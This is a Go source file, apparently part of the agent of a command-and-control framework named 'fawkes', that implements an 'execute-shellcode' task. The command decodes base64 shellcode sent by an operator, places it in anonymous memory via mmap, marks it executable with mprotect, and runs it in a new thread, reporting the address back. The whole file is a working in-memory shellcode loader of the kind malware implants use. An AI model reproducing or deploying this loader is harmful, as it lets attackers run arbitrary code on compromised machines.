//go:build linux

package commands

import (
	"encoding/base64"
	"runtime"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"
)

type ExecuteShellcodeCommand struct{}

func (c *ExecuteShellcodeCommand) Name() string {
	return "execute-shellcode"
}

func (c *ExecuteShellcodeCommand) Description() string {
	return "Execute shellcode in the current process via mmap + mprotect"
}

func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: shellcode_b64 parameter required")
	}
	args, parseErr := unmarshalParams[executeShellcodeArgs](task)
	if parseErr != nil {
		return *parseErr
	}
	if args.ShellcodeB64 == "" {
		return errorResult("Error: shellcode_b64 is empty")
	}

	shellcode, err := base64.StdEncoding.DecodeString(args.ShellcodeB64)
	if err != nil {
		return errorf("Error decoding shellcode: %v", err)
	}

	if len(shellcode) == 0 {
		return errorResult("Error: shellcode is empty after decoding")
	}

	pageSize := syscall.Getpagesize()
	allocSize := ((len(shellcode) + pageSize - 1) / pageSize) * pageSize

	data, err := syscall.Mmap(-1, 0, allocSize,
		syscall.PROT_READ|syscall.PROT_WRITE,
		syscall.MAP_PRIVATE|syscall.MAP_ANONYMOUS)
	if err != nil {
		return errorf("mmap failed: %v", err)
	}

	copy(data, shellcode)

	err = syscall.Mprotect(data, syscall.PROT_READ|syscall.PROT_EXEC)
	if err != nil {
		_ = syscall.Munmap(data)
		return errorf("mprotect RX failed: %v", err)
	}

	addr := uintptr(unsafe.Pointer(&data[0]))
	funcAddr := addr
	funcPtr := &funcAddr
	go func() {
		runtime.LockOSThread()
		fn := *(*func())(unsafe.Pointer(&funcPtr))
		fn()
	}()

	return successf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Method: mmap RW + mprotect RX\n  Thread created and running",
		len(shellcode), addr)
}
